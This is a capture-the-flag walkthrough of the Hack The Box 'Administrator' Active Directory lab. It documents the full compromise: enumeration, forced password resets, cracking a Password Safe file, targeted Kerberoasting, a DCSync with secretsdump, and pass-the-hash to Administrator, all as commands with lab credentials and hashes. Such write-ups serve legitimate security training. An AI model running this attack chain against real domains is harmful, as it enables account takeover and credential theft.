# Administrator

## Machine Informations

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: **Olivia** Password: **ichliebedich**

NetBIOS computer name: **DC**\
NetBIOS domain name: **ADMINISTRATOR**\
DNS domain: **administrator.htb**\
FQDN: **dc.administrator.htb**

## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.42

Nmap scan report for 10.10.11.42
Host is up (0.033s latency).
Not shown: 65449 closed tcp ports (reset), 59 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-28 22:15:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
57704/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57715/tcp open  msrpc         Microsoft Windows RPC
57720/tcp open  msrpc         Microsoft Windows RPC
57723/tcp open  msrpc         Microsoft Windows RPC
57737/tcp open  msrpc         Microsoft Windows RPC
62034/tcp open  msrpc         Microsoft Windows RPC
65315/tcp open  msrpc         Microsoft Windows RPC

```



## AD Enumeration

### Enum4linux

Try to execute enum4linux with creds to obtain some informations of domain and DC.

```bash
enum4linux-ng 10.10.11.42 -u 'olivia' -p 'ichliebedich'
```

### User enumeration

Having an AD valid password we can enumerate the users for example using NetExec tool

```bash
nxc smb 10.10.11.42 -u 'Olivia' -p 'ichliebedich' --rid-brute

[..SNIP..]
SMB         10.10.11.42     445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB         10.10.11.42     445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB         10.10.11.42     445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB         10.10.11.42     445    DC               1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
SMB         10.10.11.42     445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB         10.10.11.42     445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB         10.10.11.42     445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB         10.10.11.42     445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)
```



### Bloodhound

Using `bloodhound-python` tool in Kali machine we can get informations to how we can escalate our privileges.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.11.42 -dc DC.administrator.htb -d administrator.htb --zip -u 'olivia' -p 'ichliebedich'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

Olivia can access to DC via evil-winRM.



## AD Privilege Escalation 1

### evil-winRM with Olivia user

```bash
evil-winrm -i 10.10.11.42 -u 'olivia' -p 'ichliebedich'
```

Now we can start a revshell from evil-winrm. Then, upload and execute Mimikatz to extract the NTLM hashes stored in the machine.

Olivia has privilege to force password to Micheal

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

### Force change password to Micheal

If we have "GenericAll" Privilege on a user we can Force the user password.

{% code overflow="wrap" %}
```bash
Set-ADAccountPassword -Identity 'CN=Michael Williams,CN=Users,DC=administrator,DC=htb' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```
{% endcode %}

And now we can login into DC with Michael user.

```bash
evil-winrm -i 10.10.11.42 -u 'michael' -p 'Password123!'
```

From Bloodhound, we can notice that the user `Michael` has the privilege to Force Change Password to `Benjamin` user.

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>



### Force change password to Benjamin

Change Benjamin's password from michael's winrm session.

{% code overflow="wrap" %}
```powershell
Set-ADAccountPassword -Identity 'CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb
' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```
{% endcode %}

### FTP connection with Password file

Now try to connect via evil-winrm but this user can't access to DC via WinRM. We can try to access via FTP or SMB.

```bash
ftp 10.10.11.42
> benjamin
> Password123!
```

And we are login! There is a file called `Backup.psafe3` . Download it into attacker machine.

```bash
get Backup.psafe3
```

### PasswordSafe3 file and crack the hash with John

Check the file type:

```bash
file Backup.psafe3

Backup.psafe3: Password Safe V3 database
```

We can see that the file is a Password Safe 3:

> _PSAFE3 files mostly belong to Password Safe. **PSAFE3 files** are specific encrypted files from Password Safe v3._\
> _Encryption is used to secure your login credentials using a master password._\
>
>
> * _**Usage:** These files store password data in an encrypted database format._
> * _**Functionality:** They rely on the official Password Safe software to open, manage, and update the stored data._
> * _**Operation:** Only the designated application can correctly decrypt and present the information._

Now, we can try to crack the master password of DB extracting the hash from the file.&#x20;

{% code overflow="wrap" %}
```bash
pwsafe2john Backup.psafe3 > hash.txt
```
{% endcode %}

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

[..SNIP..]
tekieromucho     (Backu) 
[..SNIP..]
```

Now, using the password, let's go read the file.

```bash
pwsafe Backup.psafe3
```

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

We have the password of 3 users.

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

Make access to the DC as `emily` and the password in the PasswordSafe.

```bash
evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

### User.flag

```bash
more C:\Users\emily\Desktop\user.txt
```



## AD Privilege Escalation 2

Now, always by bloodhound we can see that the `emily` user has the `GenericWrite` privilege on `ethan` user, and `ethan` user has privilege to perferm a`DCSync attack` to Domain.

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

### Kerberoast Attack

{% code overflow="wrap" %}
```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

The `KRB_AP_ERR_SKEW(Clock skew too great)` error indicates that we have to syncronize the clock of out session with the clock of the AD.

To do this we can use the `ntpdate` tool:

```bash
sudo apt install ntpsec-ntpdate
```

```bash
sudo ntpdate 10.10.11.42
```

{% hint style="danger" %}
If we are in kali linux we also disable the auto ntp-sync with this command:

`timedatectl set-ntp 0`&#x20;
{% endhint %}

Now we can perform the kerberoast attack

<figure><img src="../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

Put the tgt ticket in a file and crack it with john

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgtkerb.txt
```

<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

### DCSync with Ethan user

Now that we have ethan's credentials we can perform a dcsync to obtain all NTLM hash of the domain.

```bash
./secretsdump.py 'administrator.htb'/'Ethan':'limpbizkit'@'10.10.11.42'
```

```
[..SNIP..]
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[..SNIP..]
```



### Pass-the-Hash for Administrator user connection

We can use the retrived NTLM hash and evil-winrm to connect into DC as Administrator.

```bash
evil-winrm -i 10.10.11.42 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```



### Root.flag

```bash
more C:\Users\Administrator\Desktop\root.txt
```



















